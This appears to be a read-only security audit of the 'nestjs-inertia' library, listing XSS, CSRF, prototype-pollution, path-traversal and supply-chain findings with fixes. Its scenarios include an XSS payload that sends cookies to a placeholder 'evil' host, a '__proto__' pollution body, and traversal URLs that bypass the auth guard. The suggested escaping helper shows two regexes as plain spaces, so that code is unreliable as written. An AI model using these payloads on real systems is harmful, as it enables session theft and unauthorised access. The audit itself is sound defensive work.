# Security Audit — `nestjs-inertia` v0.9.0-alpha.0

**Scope:** monorepo `/home/dudousxd/personal/nestjs-inertia/` (core, vite, testing, codegen, client, website). Read-only audit. Findings ordered Critical → Informational. Each finding has a file:line ref, attack scenario, and concrete recommended fix.

---

## CRITICAL

### C-1 — XSS via unescaped `</script>` in inline page JSON

**Files:**
- `packages/core/src/shell/shell.ts:9` (`DefaultShellRenderer`)
- `packages/core/src/shell/file-shell.renderer.ts:43,68` (`FileBasedShellRenderer`)
- `packages/core/src/shell/directives.ts:28` (`@inertia` directive expansion)

**Issue.** `JSON.stringify(ctx.page)` is interpolated *raw* into a `<script id="inertia-page" type="application/json">…</script>` tag. The HTML parser closes the script element on the first ASCII-case-insensitive `</script` sequence inside the text node — regardless of the JSON quoting that surrounds it. The string `"</script><img src=x onerror=alert(1)>"` becomes literal HTML after `JSON.stringify`.

The same flaw exists three times (default renderer, plain-HTML branch, template-engine branch), and the `@inertia` directive helper at `directives.ts:28` reconstructs the same vulnerable template, so engine-rendered shells (handlebars, pug, ejs, liquid) inherit it.

Note: this is exactly the pattern in the Astro CVE flagged by `pnpm audit` (`GHSA-j687-52p2-xcff`, "XSS in `define:vars` via incomplete `</script>` tag sanitization") — confirmed real and exploitable.

**Attack scenario.** A handler renders user-controllable data:
```ts
@Inertia('Profile') getMe() { return { bio: user.bio }; }
```
A user sets their bio to `</script><script>fetch('https://evil/'+document.cookie)</script>`. On the first non-Inertia (full document) request, the bio is embedded literally into the page shell. Cookies that are not `HttpOnly` (e.g. the `XSRF-TOKEN` issued by this very library — see C-2) and any session data attached to client storage are exfiltrated. Stored XSS against every viewer of that profile.

The same exploit triggers via `</script `, `<!--`, and `<script` open (in case the page is later embedded in another page), and via U+2028 / U+2029 if the JSON is parsed by an older runtime that treats them as line terminators inside strings (script type=application/json is not parsed as JS, so the unicode case is lower-severity here — but `</script>` is straight HTML-parser break-out).

**Fix.**
```ts
function safeJsonForScript(value: unknown): string {
  return JSON.stringify(value)
    .replace(/</g, '\\u003c')
    .replace(/>/g, '\\u003e')
    .replace(/&/g, '\\u0026')
    .replace(/ /g, '\\u2028')
    .replace(/ /g, '\\u2029');
}
```
Use `safeJsonForScript(ctx.page)` everywhere `JSON.stringify(ctx.page)` currently appears. Centralise it in one helper so the three call sites cannot drift. Add a regression test that includes a `</script>` payload in `ctx.page.props`.

**Priority.** Ship-blocker. The library exists to embed server data in HTML; the default rendering path is a stored-XSS sink whenever a prop value passes through any user.

---

## HIGH

### H-1 — `@ApplyContract` does not validate request payloads at runtime

**Files:**
- `packages/client/src/contract/apply-contract.decorator.ts:15-20`
- `packages/client/src/contract/contract.ts:7-9` (schemas declared on the contract)
- `packages/client/src/contract/metadata.ts:1-12`

**Issue.** The decorator stores the contract on `CONTRACT_METADATA` and applies a method decorator for the HTTP verb/path, but it never installs a pipe/guard that calls `c.body.parse(req.body)` or `c.query.parse(req.query)`. The Zod schemas are read by the codegen probe (`packages/codegen/src/discovery/probe.ts:154-168`) to emit TS types — that is the *only* use.

**Attack scenario.** Users see `Contract.post('/api/users', { body: z.object({ name: z.string().min(1) }), … })` and reasonably assume the body is validated. They write
```ts
@ApplyContract(Contract.post('/api/users', { body: z.object({ name: z.string() }), response: … }))
createUser(@Body() body: { name: string }) { db.users.create(body); }
```
A client sends `{ "name": 0, "isAdmin": true, "tenantId": "victim-tenant" }`. Nothing validates the shape, nothing strips unknown keys, the controller silently passes the unsanitized payload to the ORM. Mass-assignment, type confusion (`name` is a number where SQL expects a string and may bypass length checks), and trust-boundary failure follow. Because the Zod schema looks authoritative in the source, this defect is invisible during review.

**Fix.** Either:
1. Install a method interceptor inside `ApplyContract` that, on each call, parses `req.body` / `req.query` against the schemas and throws `BadRequestException` on failure; or
2. Document loudly in `apply-contract.decorator.ts` (and the README) that the contract is **codegen-only** and require users to attach `ZodValidationPipe` manually. Add a runtime warning the first time a request hits a contract-decorated handler in dev mode.

Option 1 is the safer default — most users expect "contract" to mean "enforced contract."

**Priority.** High. This is a footgun that produces silently insecure apps even when developers follow the documented pattern.

### H-2 — Vulnerable transitive dependencies (`pnpm audit`)

`pnpm audit` flags the following in the production dependency graph of `packages/core`:

| Severity | Package | Path | Advisory |
|----------|---------|------|----------|
| high | `fastify@4.29.1` | `packages/core > fastify` | GHSA-jx2c-rxcm-jvmq — Content-Type tab char allows body-validation bypass (<5.7.2) |
| high | `fast-uri@2.4.0` | `core > fastify > @fastify/ajv-compiler > fast-uri` | GHSA-q3j6-qgpj-74h6 — path traversal via percent-encoded dots (<=3.1.0) |
| high | `fast-uri@2.4.0` | same | GHSA-v39h-62p7-jpjc — host confusion via percent-encoded authority delimiters (<=3.1.1) |
| moderate | `fastify@4.29.1` | same | GHSA-444r-cwp2-x5xf — `request.protocol`/`request.host` spoofable via X-Forwarded-* |
| moderate | `vite@5.4.21` (examples + vitest) | dev-only | GHSA-4w7w-66w2-5vf9 — path traversal in `.map` handling |
| moderate | `esbuild@0.21.5` (vitest, examples) | dev-only | GHSA-67mh-4wv8-2f99 — dev-server CORS bypass |
| low | `fastify@4.29.1` | same | DoS via unbounded `sendWebStream` |

**Fix.** Bump `packages/core` peer/dev `fastify` to `^5.8.3` (clears all three fastify advisories and the transitive `fast-uri`). The vite/esbuild advisories are dev-only and can be addressed by upgrading `vitest` to a release pulling vite ≥6.4.2. `astro` in `website/` should be bumped to ≥6.1.6 (see also C-1 — Astro patched the same `</script>` bug that the core library still ships).

**Priority.** High. `fastify` is the runtime HTTP server for Fastify-mode deployments; the body-validation bypass directly weakens any contract validation users install. The `fast-uri` path-traversal CVE is in the routing layer.

### H-3 — CSRF token is double-submit but never bound to a session/user

**Files:**
- `packages/core/src/csrf/csrf-token.ts:3-19`
- `packages/core/src/csrf/csrf.guard.ts:23-40`
- `packages/core/src/csrf/csrf-cookie.interceptor.ts:34-50`

**Issue.** Tokens are `randomBytes(32).base64url + '.' + HMAC(secret, raw)`. The HMAC binds the token to *the server's secret*, not to a session, user, or fingerprint. Verification only checks: (a) cookie equals header (`===` string compare), and (b) HMAC is valid. There is no rotation on login/logout, no per-session binding, and no user-id binding.

Combined with the cookie defaults at `csrf-cookie.interceptor.ts:37-42` — `httpOnly: false, secure: false, sameSite: 'lax'` — and the fact that the token is *intentionally* JS-readable for header propagation, an attacker who gets *any* XSS once on the site (see C-1) can extract a valid CSRF token from a victim and replay it forever — the token does not change on logout, login, or password reset.

Even without XSS: token fixation is possible. An attacker visits the site (no auth), receives a CSRF cookie, and then convinces a victim to set the same cookie (subdomain takeover, MITM on HTTP because `secure: false`, etc.). After the victim authenticates, the attacker's known token is still valid because the token never rotated.

**Attack scenarios.**
1. **Long-lived token after XSS.** XSS exfiltrates `document.cookie['XSRF-TOKEN']`. Even after the user logs out and back in, the same token still validates — attacker performs CSRF forever from off-site.
2. **Token fixation pre-auth.** Pre-auth victim is given a token chosen by the attacker; post-auth requests with that token are accepted.
3. **HTTP downgrade.** `secure: false` default means the cookie travels over `http://` in dev-like deployments and any mixed-content scenario. A passive on-path attacker reads the token and replays.

**Fix.**
- Bind the HMAC payload to a per-session identifier: `HMAC(secret, raw + '|' + sessionId)`. Read session id from the request adapter; reject tokens whose embedded session id no longer matches.
- Rotate token on successful authentication and on logout (helper: `req.inertia.rotateCsrf()` that clears + re-emits the cookie).
- Flip default `secure` to `true` when `NODE_ENV === 'production'` (override per option). Flip default `sameSite` from `'lax'` to `'strict'` for the cookie (header-based CSRF still works for same-site GET/POST).
- Document that `httpOnly: false` is required for header propagation, and recommend a pattern where the *server* writes the token into the page shell (after C-1 is fixed) rather than relying on a JS-readable cookie. Then `httpOnly: true` becomes possible.

**Priority.** High. The library's CSRF scheme is the security boundary for state-changing requests; weak binding undermines it.

### H-4 — `discoverRoutes` `fork()` spawns arbitrary file paths without validation

**Files:**
- `packages/codegen/src/discovery/routes.ts:55-64`
- `packages/codegen/src/discovery/probe.ts:93-108`
- `packages/codegen/src/config/load-config.ts:33-35,89-95`

**Issue.** `discoverRoutes` does `fork(probeScript, [moduleEntry], …)` where `moduleEntry` comes from `nestjs-inertia.config.ts` (a TS file `tsImport()`ed at codegen startup). The probe then does `await import(moduleEntryPath)` — Node ESM resolution with **no path containment**. Any string that resolves to a JS/TS file is executed.

`load-config.ts` itself executes the user's TS config via `tsx`, so a malicious `nestjs-inertia.config.ts` can run arbitrary code immediately (this is documented behaviour for build tooling — fine). The probe is launched with `execArgv: ['--import', tsxEsmPath]`, and `TSX_TSCONFIG_PATH` is set from `userConfig.app.tsconfig` (also user-controlled in the config file).

The actually-interesting risk is **post-install supply-chain**: an attacker who publishes a malicious package and gets a developer to install it can drop a `nestjs-inertia.config.ts` (or modify one) such that `moduleEntry` is a path under `node_modules/...` that boots a different (malicious) NestModule than the one the developer thinks. Because `probe.ts:101-104` falls back to `mod.default ?? (Object.values(mod).find((v) => typeof v === 'function'))`, *any* exported function is treated as `AppModule` and `NestFactory.create()`'d. The probe runs every time the developer runs the CLI or starts the dev server (auto-bootstrap, `module.ts:386`).

**Attack scenario.** Malicious npm package `pretty-logger-helper@1.0.1`. Postinstall script appends a line to `nestjs-inertia.config.ts` changing `moduleEntry: 'src/app.module.ts'` to `moduleEntry: 'node_modules/pretty-logger-helper/dist/app.module.js'`. On next `pnpm dev`, the developer's Nest app appears to start (codegen probe boots their module and posts back routes), but in parallel the codegen probe also boots the attacker's `AppModule`, which has access to the developer's full env (including `process.env` — DB creds, signing keys, etc.). Exfil over IPC or via `fetch()` inside the probe.

**Fix.**
- Validate `moduleEntry` is inside `resolvedCwd` after `resolveAbsolute()`: `if (!moduleEntry.startsWith(resolvedCwd + sep)) throw ConfigError(...)`.
- Reject `moduleEntry` paths that resolve into `node_modules/` unless an explicit `allowExternalEntry: true` is set.
- Sanitise `TSX_TSCONFIG_PATH` the same way.
- Log the resolved `moduleEntry` path to the console on probe spawn so a developer sees it changed.

**Priority.** High in supply-chain-adversarial contexts; medium otherwise. Dev-only attack surface, but dev machines hold the keys to prod.

---

## MEDIUM

### M-1 — Prototype-pollution sink in `setNested` / `unpackDotKeys`

**File:** `packages/core/src/helpers/set-nested.ts:3-49`

**Issue.** `setNested` walks `cur[key]` with `key` coming from `Object.keys(props)`. The starting `target` is a plain `{}` (not `Object.create(null)`), so `cur['__proto__']` returns `Object.prototype`. If a developer ever does
```ts
@Inertia('Page') get() { return req.query as Record<string, unknown>; }
```
or pipes any user-supplied object directly through `inertia.render(component, userObj)`, a query string like `?__proto__.polluted=yes` becomes a prop key. The handler returns `{ '__proto__.polluted': 'yes' }`, `unpackDotKeys` splits on `.`, and `setNested` walks `cur['__proto__']['polluted'] = 'yes'`. **Global `Object.prototype.polluted` is now set.**

Inside the library itself, `service.ts:225` does `inertia.render(component, props)` where `props` comes from the controller return value — fully developer-controlled — but users commonly spread `req.body` / `req.query` for forms-back-with-errors flows, and this is a generic JS pollution sink waiting for that pattern.

**Attack scenario.** Developer writes
```ts
@Inertia('UserSettings') save(@Body() body: any) { /* validate elsewhere */ return body; }
```
Attacker POSTs `{ "__proto__.isAdmin": true }`. Subsequent unrelated requests that check `if (user.isAdmin)` on plain objects now read the polluted prototype.

**Fix.** In `setNested`, refuse keys that match `__proto__`, `prototype`, or `constructor`:
```ts
const FORBIDDEN = new Set(['__proto__', 'prototype', 'constructor']);
for (let i = 0; i < path.length - 1; i++) {
  const key = path[i]!;
  if (FORBIDDEN.has(key)) throw new Error(`forbidden key: ${key}`);
  …
}
```
Apply the same check to the final-segment write. Also initialise `out` in `unpackDotKeys` with `Object.create(null)` so the walk cannot reach the global prototype.

**Priority.** Medium — depends on the user pattern, but the library has no defence and the path through `inertia.render(component, props)` is the documented happy-path API.

### M-2 — `auth.guard.ts` path-prefix matching uses unnormalised URL

**File:** `packages/core/src/guard/auth.guard.ts:8-15, 83-86`

**Issue.** `matchesAllow` checks `path.startsWith(prefix)` against `req.originalUrl ?? req.url`. The URL is **not normalised**: query strings, encoded slashes (`%2f`), `..` traversal, and double-slashes pass through. Express and Fastify normalise paths *before routing*, but `originalUrl` may still contain the raw form. Combined with the allow-list semantics (`/public/*` allows everything under `/public/`), this opens several classes of bypass.

**Attack scenario.**
- Allow-list = `['/public/*']`. Attacker requests `/public/../admin?x=1`. `originalUrl = '/public/../admin?x=1'` starts with `/public/`, so guard passes. The router resolves the same URL to `/admin`. Auth bypassed.
- Allow-list = `['/api/health']`. Attacker requests `/api/health?return_to=evil`. Exact-match fails, but `path.startsWith('/api/')` is not checked here so this specific case is fine — but `'/api/health/*'` allow would let `/api/health/../admin` through.
- Open-redirect via `signInUrl`: `signInUrl = '/login'`. Attacker hits `/anything` → guard sends `Location: /login?return_to=/anything`. If `signInUrl` is ever user-influenced (e.g. read from config that an attacker can set), it becomes an open-redirect because no validation that `signInUrl` is same-origin.

**Fix.**
- Strip the query string before matching: `const path = (rawPath.split('?', 1)[0]); …`.
- Reject URLs containing `..`, `//`, or `%2f` (or normalise with `node:path/posix#normalize` after decoding).
- In the redirect path, validate that `signInUrl` starts with `/` and does not start with `//` (to prevent `//evil.com` open-redirect via protocol-relative URL).

**Priority.** Medium. The most common configs (`['/public/*']`, `signInUrl: '/login'`) are exploitable but require the developer to choose risky patterns.

### M-3 — `host`/`protocol` spoofing not addressed; `originalUrl` echoed in 409 Location

**File:** `packages/core/src/service.ts:234`

**Issue.** Version mismatch path responds `409 X-Inertia-Location: req.originalUrl`. `originalUrl` is fully attacker-controlled. Combined with the Fastify spoofing CVE (H-2: `GHSA-444r-cwp2-x5xf`) and the lack of host validation, an attacker can craft a URL that includes a userinfo segment or unusual characters and have the server echo them in a response header. The Inertia client treats `X-Inertia-Location` as a hard navigation target — so a crafted `originalUrl` that the framework lets through (e.g., contains `\r\n` after a CDN strips one but not the other) becomes a header-injection / open-redirect vector.

Express normalises CRLF in headers (refuses them), so the CRLF case is unlikely to land. The open-redirect-via-version-mismatch is more concerning: an attacker who can make a victim's browser send `X-Inertia-Version: stale` (e.g. via a cached SPA after a deploy) plus a crafted `originalUrl` could be steered. Lower likelihood, real impact.

**Fix.** Validate that `req.originalUrl` is a same-origin pathname before echoing into `X-Inertia-Location`. If it isn't, fall back to `/`.

**Priority.** Medium.

### M-4 — `loadManifest` silently swallows JSON.parse errors and continues

**File:** `packages/core/src/asset/version.provider.ts:17-25`

**Issue.** `JSON.parse(raw)` is cast to `Manifest` without any shape validation, then served as a trusted asset-resolver. If a build pipeline writes a partially-corrupt manifest (e.g. truncated due to disk-full), `JSON.parse` throws and the catch returns `null` — but if the manifest *parses* but contains attacker-controlled values (e.g. an attacker who can write to `dist/inertia/client/.vite/manifest.json`), every `@vite('foo')` directive expands to a `<script src="/...">` tag using that path. A poisoned manifest gives `<script src="/evil.js">`.

This requires write access to the build artifacts, so it's a defence-in-depth issue, not a primary attack vector. Still: the manifest is treated as fully trusted with zero shape validation (`entryRecord.file`, `entryRecord.css` are not validated to be safe URLs).

**Fix.** Validate manifest entries against a minimal schema; reject `file` / `css` values that contain `://`, start with `//`, or contain `<>`.

**Priority.** Medium (build-server integrity dependency).

### M-5 — `methodSpoofing` middleware does not validate origin of `_method`

**File:** `packages/core/src/middleware/method-spoof.middleware.ts:12-25`

**Issue.** A `POST` with `multipart/...` content-type and `_method=DELETE` in the body is silently upgraded to a `DELETE` request *before* the CSRF guard runs. Because CSRF is verb-based (`SAFE = GET/HEAD/OPTIONS`), this is fine for CSRF *protection* — CSRF still triggers because the upgraded `DELETE` is not safe. But the `methodSpoofing` flag defaults to *enabled* (line 13: `if (this.options.methodSpoofing === false) return next();` — undefined falls through), and there is no logging or audit trail of which requests were upgraded.

More subtly: the middleware mutates `req.method` and `req.body._method = undefined`. Later middleware that performs idempotency keying based on `req.method + req.url` may now see a `DELETE` where the wire-level method was `POST`, which can confuse logging, rate limiting, and WAF rules. WAFs that whitelist `POST` for multipart and block `DELETE` will not see the `DELETE` because it was synthesised after the WAF passed.

**Fix.** Default `methodSpoofing` to `false`. Document explicitly. Log spoofed method changes at `debug` level. Add to README that any pre-Nest WAF/proxy must be aware of method spoofing.

**Priority.** Medium.

### M-6 — `pageJson` is also unescaped in `processDirectives` `@inertia` expansion

**File:** `packages/core/src/shell/directives.ts:28`

(Already covered by C-1, called out separately because the directive runs on **engine output** at `file-shell.renderer.ts:81`, meaning template-engine users who *expected* engine escaping to protect them still get the unescaped JSON inserted post-render.)

**Fix.** Use `safeJsonForScript` (C-1 fix) inside `processDirectives` for the `@inertia` branch. Then also pass the *already-escaped* string in via `ctx.pageJson` so callers cannot accidentally re-introduce the unsafe form.

**Priority.** Medium (covered by C-1, separately listed because templated-shell users may otherwise assume engine auto-escape saves them).

---

## LOW

### L-1 — `timingSafeEqual` buffer length mismatch is caught but ignored

**File:** `packages/core/src/csrf/csrf-token.ts:14-18`

The current code wraps `timingSafeEqual` in `try/catch` and returns `false`. This is correct (different lengths throw). Two minor improvements:
1. Explicitly check `Buffer.byteLength(sig) === Buffer.byteLength(expected)` before the call; the throw path is not strictly constant-time and gives a timing oracle on length. Minor.
2. The `token.split('.', 2)` returns at most 2 parts; if the input has multiple dots (e.g., `a.b.c`), the second part is `b`, and `c` is silently dropped — a token of the form `raw.sig.junk` validates as `raw.sig`. Tighten to reject tokens with !== 2 dot-separated parts.

**Priority.** Low. Defence-in-depth.

### L-2 — `flashStore.read()` errors are swallowed silently

**File:** `packages/core/src/service.ts:240-248`

The `try { await this.deps.flashStore.read(...) } catch {}` block hides errors during flash-error reading. If a misconfigured flash store consistently throws, errors are never surfaced — failures are invisible (e.g. session backend is unreachable, but UX continues without showing the user any validation errors). Log the error at `warn` level instead of silently catching.

**Priority.** Low.

### L-3 — `pages.d.ts` emission uses single-quote interpolation without escaping

**File:** `packages/codegen/src/emit/emit-pages.ts:10,18-20`

`needsQuotes(name) ? \`'${p.name}'\`` does not escape single quotes inside `p.name`. A page filename `foo'.tsx` produces broken TypeScript. Not exploitable (codegen is dev-only and files come from the developer's own filesystem), but produces confusing build errors and could in theory be abused by a malicious page filename to inject TS code that runs at compile time of the *consumer* project. Use `JSON.stringify(p.name)` instead.

**Priority.** Low.

### L-4 — `NESTJS_INERTIA_CODEGEN_PROBE=1` is the only prod-skip backstop

**File:** `packages/core/src/module.ts:403-446`

Auto-bootstrap of the codegen watcher is gated on `NODE_ENV !== 'production'` plus `NESTJS_INERTIA_CODEGEN_PROBE !== '1'`. If a deployment misconfigures `NODE_ENV` (common Docker pitfall: setting `NODE_ENV=development` in prod to enable verbose logs), the watcher boots, opens `chokidar` file handles, and dynamically `import()`s `@dudousxd/nestjs-inertia-codegen` — pulling in `tsx`, `ts-morph`, etc. in a prod process. Performance hit and increased attack surface. Recommend additionally checking:
- The presence of a `package.json` `scripts.dev`-style marker, or
- An explicit `codegen: { enabled: true }` opt-in for non-prod, or
- Refusing to boot if `process.env.npm_lifecycle_event` matches `start`/`start:prod`.

The reverse direction (attacker setting `NESTJS_INERTIA_CODEGEN_PROBE=1` to keep an old codegen running) is not a meaningful threat because that env var *disables* the watcher; an attacker setting it just prevents fresh codegen from starting. The threat is the *missing* prod skip, not a bypass.

**Priority.** Low.

### L-5 — `ApiHttpError.body` is captured and may serialize into logs

**File:** `packages/client/src/fetcher/errors.ts:1-34`

`ApiHttpError` holds the entire response body as a public field. Common error-reporting libraries (Sentry, etc.) auto-serialise `Error` properties. If the server returns a 4xx with a body containing sensitive content (a leaked password, an internal token, a stack trace with paths), it ends up in the client telemetry. This is a defence-in-depth concern; the *correct* fix is server-side hygiene, but the library could mark `body` as non-enumerable or redact known-sensitive keys.

**Priority.** Low.

### L-6 — `buildUrl` does not URL-encode interpolated path params

**File:** `packages/client/src/fetcher/url-builder.ts:16-22`

`path.replace(/:(\w+)/g, (_, key) => String(val))` interpolates raw `String(val)` into the path. A param value of `foo/bar` becomes a *path segment break* (`/users/foo/bar` instead of `/users/foo%2Fbar`); a value containing `?` becomes a query-string injection (`/users/abc?evil=1` instead of `/users/abc%3Fevil%3D1`). Server-side routing then matches a different route than the caller intended.

**Attack scenario.** Code calls `fetcher.get('/users/:id', { params: { id: userInput } })`. `userInput = "../admin"` produces `/users/../admin` — `fetch` normalises and ships `GET /admin` to the server. The client thought it was fetching user `../admin`; the server sees an admin-route request bearing the user's auth cookie. Confused-deputy.

**Fix.** `return encodeURIComponent(String(val));`

**Priority.** Low-to-medium. Real bug, real impact, but only triggers when callers pass un-validated user input as a path param — which is exactly the common pattern.

### L-7 — CSRF guard uses raw `!==` on cookie/header tokens (no constant-time compare)

**File:** `packages/core/src/csrf/csrf.guard.ts:36`

`if (cookieToken !== headerToken)` is short-circuit string compare — leaks length and prefix timing. Tiny attack surface (the attacker would need to control header and observe response timing across many requests), but the next line *does* use `timingSafeEqual` for HMAC verification. The cookie-vs-header check should also be constant-time for consistency.

**Priority.** Low.

---

## INFORMATIONAL

### I-1 — Vite plugin/setup permits arbitrary `configFile` and `outDir`

**Files:** `packages/vite/src/setup.ts:23,37`, `packages/vite/src/plugin/plugin.ts:23,99`

Both helpers `resolve(process.cwd(), …)` user-provided paths with no containment. This is appropriate for build tooling — the user *should* be able to point at any config — but document that these helpers are not safe to feed runtime-derived strings into.

### I-2 — `loadConfig` resolves `outDir` and `moduleEntry` relative to `cwd` with no jail

**File:** `packages/codegen/src/config/load-config.ts:38-55`

Same comment as I-1: dev-tool, user-controlled config. Document that an attacker who can write `nestjs-inertia.config.ts` can write anywhere on disk via `codegen.outDir: '/etc/whatever'`. Fix is environmental (don't let untrusted code modify the config), not in this library.

### I-3 — `SsrLoaderService` `import()` of user-provided bundle path

**File:** `packages/core/src/ssr/ssr-loader.service.ts:24-28`

`opts.ssr.bundlePath` is `import()`ed without validation. Same trust model as I-1/I-2: legitimate when developer-controlled, dangerous if the path can be influenced by attackers (e.g. via env var or untrusted config layer). Document.

### I-4 — No CSP / `Content-Security-Policy` header is set by the library

The library renders inline `<script id="inertia-page">` tags, which is incompatible with strict CSP (`script-src 'self'` would block them). Document a recommended CSP and an opt-in nonce-injection helper. Without CSP, C-1 has no mitigation in depth.

### I-5 — `MethodSpoofMiddleware.options.methodSpoofing` default is implicit-enabled

Already covered as M-5; flagged again because users browsing the README may not realise spoofing is on by default.

### I-6 — Codegen `auto-bootstrap` performs network-less `import('@dudousxd/nestjs-inertia-codegen')`

The auto-bootstrap is intentionally peer-optional. Make sure documentation states clearly that installing `@dudousxd/nestjs-inertia-codegen` causes a watcher to start automatically in dev — surprising for users who installed it transitively.

---

## Sections explicitly clean

- **Asset-version computation (`asset/version.provider.ts`)** — uses `sha1` for non-security versioning (cache busting); acceptable. `randomUUID` fallback is fine.
- **`MethodSpoofMiddleware` body mutation** — limited to `_method` field only; cannot inject arbitrary keys.
- **`RedirectInterceptor`** — only mutates status codes, no header injection vectors.
- **Express/Fastify adapters** — thin wrappers, no validation gaps.
- **Vite plugin HMR exposure** — middleware mode only in dev branch (`setup.ts:20-32`); production branch (line 33+) does not start HMR. Correct.

---

## Recommended remediation order

1. **C-1** — fix `</script>` escaping in all three shell render paths. One day of work + tests. Ship-blocker.
2. **H-1** — either install runtime validation in `@ApplyContract` or document loudly. Two days.
3. **H-2** — `pnpm up fastify@^5.8.3` in `packages/core`; audit clean.
4. **H-3** — bind CSRF token to session and rotate on auth state change. Flip cookie defaults.
5. **H-4** — add path-jail to `moduleEntry` validation in `load-config.ts`.
6. **M-1** — block `__proto__`/`prototype`/`constructor` in `setNested`.
7. **M-2**, **M-3** — auth-guard path normalisation, location header sanitisation.
8. **L-6** — `encodeURIComponent` in `buildUrl`.
9. Remaining low/info as time permits.

---

_Audit performed read-only against `main` @ v0.9.0-alpha.0. No source files were modified. `pnpm audit` snapshot taken at audit time._
